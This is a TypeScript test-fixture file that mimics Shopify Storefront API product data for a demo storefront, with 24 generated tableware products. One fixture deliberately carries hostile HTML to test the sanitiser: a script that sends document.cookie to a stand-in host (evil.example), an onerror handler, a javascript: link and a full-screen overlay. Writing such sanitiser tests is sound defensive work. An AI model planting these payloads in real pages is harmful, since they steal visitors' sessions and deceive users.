/**
 * Fixture data shaped exactly like Storefront API responses.
 *
 * Wire-shaped rather than domain-shaped on purpose: fixtures that skip the
 * `edges`/`node` plumbing would test the mapping layer against itself, and the
 * mapping layer is precisely the code most likely to be wrong.
 *
 * Generated from a short list of names rather than written out 24 times — the
 * count exists to make the storefront's virtualised grid meaningful, and 24
 * hand-written literals would be 24 opportunities for an inconsistent one.
 */

/** The shop these fixtures pretend to belong to. */
export const MOCK_SHOP_DOMAIN = 'demo-shop.myshopify.com'

/**
 * A placeholder token, obviously fake by construction.
 *
 * Never a real value, even a revoked one: a token-shaped string in a repository
 * teaches the wrong habit and invites someone to "just update it".
 */
export const MOCK_STOREFRONT_TOKEN = 'mock-public-storefront-token'

/** Currency for every fixture price. */
export const MOCK_CURRENCY = 'USD'

const NAMES = [
  'Stoneware Mug',
  'Speckled Bowl',
  'Linen Apron',
  'Cast Iron Pan',
  'Walnut Board',
  'Ceramic Jug',
  'Copper Whisk',
  'Rattan Tray',
] as const

/**
 * A hostile product description, served by fixture 1.
 *
 * Real merchant HTML is a trust boundary, so the fixtures exercise it. Every
 * payload here is one the sanitiser must neutralise: a script element, an
 * event handler, a `javascript:` URL, and a positioned overlay.
 */
const HOSTILE_DESCRIPTION =
  '<p>Thrown by <strong>hand</strong> in Bandung.</p>' +
  '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>' +
  '<img src="x" onerror="alert(document.domain)">' +
  '<a href="javascript:alert(1)">Care guide</a>' +
  '<p style="position:fixed;inset:0;z-index:9999">Click here to win</p>'

const SAFE_DESCRIPTION =
  '<p>Small-batch, <em>kiln-fired</em>, and made to be used daily.</p>' +
  '<ul><li>Dishwasher safe</li><li>Microwave safe</li></ul>'

/** One product as the Storefront API would return it. */
export interface WireProduct {
  readonly id: string
  readonly handle: string
  readonly title: string
  readonly availableForSale: boolean
  readonly descriptionHtml: string
  readonly featuredImage: {
    readonly url: string
    readonly altText: string | null
    readonly width: number
    readonly height: number
  } | null
  readonly priceRange: {
    readonly minVariantPrice: { readonly amount: string; readonly currencyCode: string }
  }
  readonly variants: {
    readonly edges: readonly {
      readonly node: {
        readonly id: string
        readonly title: string
        readonly availableForSale: boolean
        readonly price: { readonly amount: string; readonly currencyCode: string }
      }
    }[]
  }
}

/** Price in whole dollars for product `index`, as a Shopify decimal string. */
function priceFor(index: number): string {
  return `${19 + (index % 8) * 10}.00`
}

/** 24 products; `sentra-piece-1` carries the hostile description. */
export const FIXTURE_PRODUCTS: readonly WireProduct[] = Array.from({ length: 24 }, (_, offset) => {
  const index = offset + 1
  const name = NAMES[offset % NAMES.length] ?? 'Sentra Piece'
  const amount = priceFor(offset)
  /* Every fourth product is out of stock, so the listing has a real
       unavailable state to render rather than a uniformly happy catalogue. */
  const availableForSale = index % 4 !== 0
  return {
    id: `gid://shopify/Product/${index}`,
    handle: `sentra-piece-${index}`,
    title: `${name} No. ${index}`,
    availableForSale,
    descriptionHtml: index === 1 ? HOSTILE_DESCRIPTION : SAFE_DESCRIPTION,
    featuredImage: {
      url: `https://cdn.shopify.com/s/files/1/0001/sentra-piece-${index}.jpg`,
      altText: `${name} No. ${index}`,
      width: 1200,
      height: 1200,
    },
    priceRange: { minVariantPrice: { amount, currencyCode: MOCK_CURRENCY } },
    variants: {
      edges: [
        {
          node: {
            id: `gid://shopify/ProductVariant/${index}-0`,
            title: 'Default',
            availableForSale,
            price: { amount, currencyCode: MOCK_CURRENCY },
          },
        },
      ],
    },
  }
})

/** Variant id → its product, for cart line rendering. */
export const FIXTURE_VARIANT_INDEX: ReadonlyMap<string, WireProduct> = new Map(
  FIXTURE_PRODUCTS.flatMap((product) =>
    product.variants.edges.map((edge) => [edge.node.id, product] as const),
  ),
)

/** The one collection these fixtures expose. */
export const FIXTURE_COLLECTION = { handle: 'tableware', title: 'Tableware' } as const
